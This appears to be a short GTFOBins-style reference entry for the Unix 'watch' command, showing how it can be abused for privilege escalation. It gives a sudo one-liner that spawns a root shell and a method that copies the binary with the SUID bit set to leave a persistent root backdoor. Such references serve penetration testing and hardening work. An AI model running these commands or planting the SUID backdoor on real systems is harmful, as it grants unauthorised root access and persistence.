***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * sudo sh -c 'cp $(which watch) .; chmod +s ./watch'

      ./watch 'reset; exec sh 1>&0 2>&0'
